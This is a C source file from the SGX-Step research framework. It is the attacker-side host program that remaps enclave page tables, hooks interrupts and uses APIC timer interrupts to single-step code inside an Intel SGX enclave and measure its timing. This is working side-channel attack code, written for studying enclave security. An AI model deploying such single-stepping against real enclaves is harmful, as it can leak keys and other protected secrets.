/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/cpu.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/spy.h"
#include "libsgxstep/config.h"

#ifndef NUM_BENCH
    #define NUM_BENCH               1
#endif

#define EDBGRD_RIP                  0
#define SPAWN_SPY                   0

#define MICROBENCH                  1
#define BSEARCH                     2
#define ZIGZAGGER                   3
#ifndef ATTACK_SCENARIO
    #define ATTACK_SCENARIO         MICROBENCH
#endif

sgx_enclave_id_t eid = 0;
int irq_cnt = 0;
int fault_cnt = 0;
uint64_t *pmd_encl = NULL;
uint64_t *pte_step    = NULL;
uint64_t *pte_bench    = NULL;
uint64_t *pmd_step    = NULL;
uint64_t *pte_trigger = NULL;
uint64_t erip_prev = 0x0;


uint64_t __attribute__((aligned(0x1000))) dummy = 0;

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(void)
{
    #if EDBGRD_RIP
        uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
        info("^^ enclave RIP=%#llx; ACCESSED=%d; latency=%d",
            erip_prev, ACCESSED(*pmd_step), nemesis_tsc_aex - nemesis_tsc_eresume);
        /*  
         * NOTE: the stored SSA.rip is the instruction that will be executed upon
         * ERESUME (i.e., _not_ the one we just measured)
         */
        erip_prev = erip;
        irq_cnt++;
    #else
        if (ACCESSED(*pmd_step))
        {
            info("^^ enclave RIP=%#llx; ACCESSED=%d; latency=%d",
                0xff, 0x1, nemesis_tsc_aex - nemesis_tsc_eresume);
            irq_cnt++;
        }
        else
            info("WARNING: ignoring zero-step");
    #endif

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     */
    *pmd_step = MARK_NOT_ACCESSED( *pmd_step );

    //clflush(pte_step);
    //clflush(pte_bench);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
    *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
    //clflush(&dummy);
    if (!ACCESSED(*pte_trigger))
    {
        /* XXX
         * active HyperThreading spy increases zero-step fraction (?)
         * EDBGRD ioctl call seems to decrease zero-stepping
         */
        apic_timer_irq( SGX_STEP_TIMER_INTERVAL + SPAWN_SPY);
    }
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal)
{
    info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pte_step = MARK_NOT_EXECUTE_DISABLE(*pte_step);
    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
    *pmd_step = MARK_NOT_ACCESSED(*pmd_step);

    ASSERT(fault_cnt++ < NUM_BENCH+10);
    

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

int irq_count = 0;

/* ================== ATTACKER INIT/SETUP ================= */

volatile int spy_start = 0, spy_stop = 0;

void run_spy(int eid)
{
    info("hi from spy!");
	print_system_settings();
    spy_start = 1;
    while(!spy_stop);
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    idt_t idt = {0};

    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    ASSERT( !claim_cpu(VICTIM_CPU) );

    #if SPAWN_SPY
        spawn_spy(SPY_CPU, run_spy, 0);
        while(!spy_start);
    #endif

    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
	print_system_settings();

    if (isatty(fileno(stdout)))
    {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();

    info("Establishing user space IDT mapping");
    map_idt(&idt);
    install_user_irq_handler(&idt, NULL, IRQ_VECTOR);
}

void single_step_enable(void)
{
    #if SINGLE_STEP_ENABLE
        *pte_step = MARK_EXECUTE_DISABLE(*pte_step);
    #endif
    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    void *code_adrs, *bench_adrs;

    #if (ATTACK_SCENARIO == BSEARCH)
        SGX_ASSERT( get_bsearch_adrs( eid, &code_adrs) );
    #elif (ATTACK_SCENARIO == ZIGZAGGER)
        SGX_ASSERT( get_zz_adrs( eid, &code_adrs) );
    #else
        SGX_ASSERT( get_bench_adrs( eid, &code_adrs) );
    #endif

    info("enclave step code adrs at %p\n", code_adrs);
    ASSERT( pte_step = remap_page_table_level( code_adrs, PTE) );
    ASSERT( pmd_step = remap_page_table_level( code_adrs, PMD) );


    SGX_ASSERT( get_bench_data_adrs( eid, &bench_adrs) );
    ASSERT( pte_bench = remap_page_table_level( bench_adrs, PTE) );

    SGX_ASSERT( get_trigger_adrs( eid, &code_adrs) );
    info("enclave trigger code adrs at %p\n", code_adrs);
    ASSERT( pte_trigger = remap_page_table_level( code_adrs, PTE) );

    ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
	sgx_launch_token_t token = {0};
	int apic_fd, encl_strlen = 0, updated = 0;
    int i, plain, cipher, rv;

   	info_event("Creating enclave...");
	SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );


    SGX_ASSERT( do_inst_slide(eid, &dummy) );
    /*
     * We use an _unprotected_ global variable to easily leak iteration
     * numbers to annotate the training data extracted by the driver.
     */
    SGX_ASSERT( set_global_var_pt(eid, &dummy) );
    SGX_ASSERT( set_rsa_key(eid, 0x5123) );
    SGX_ASSERT( rsa_encode(eid, &cipher, 65) );
    info("cipher is %d\n", cipher);

    /* 1. Setup attack execution environment. */
    attacker_config_runtime();
    attacker_config_page_table();
    apic_timer_oneshot(IRQ_VECTOR);

    /* 2. Single-step enclaved execution. */
    info_event("calling enclave ATTACK=%d; NUM_BENCH=%d; TIMER=%d",
        ATTACK_SCENARIO, NUM_BENCH, SGX_STEP_TIMER_INTERVAL);

    #if (ATTACK_SCENARIO == MICROBENCH)
        single_step_enable();
        SGX_ASSERT( do_inst_slide(eid, &dummy) );
    #else
        for (i=0; i < NUM_BENCH; i++)
        {
            single_step_enable();
            #if (ATTACK_SCENARIO == ZIGZAGGER)
                SGX_ASSERT( do_zigzagger(eid) );
            #else
                SGX_ASSERT( do_bsearch(eid, &rv, 10) );
                info("do_bsearch returned index %d", rv);
            #endif
            //SGX_ASSERT( rsa_decode(eid, &plain, cipher) );
        }
    #endif

    /* 3. Restore normal execution environment. */
    apic_timer_deadline();
   	SGX_ASSERT( sgx_destroy_enclave( eid ) );
    info_event("all done; counted %d IRQs", irq_cnt);

    #if SPAWN_SPY
        spy_stop = 1;
        join_spy();
    #endif
    return 0;
}
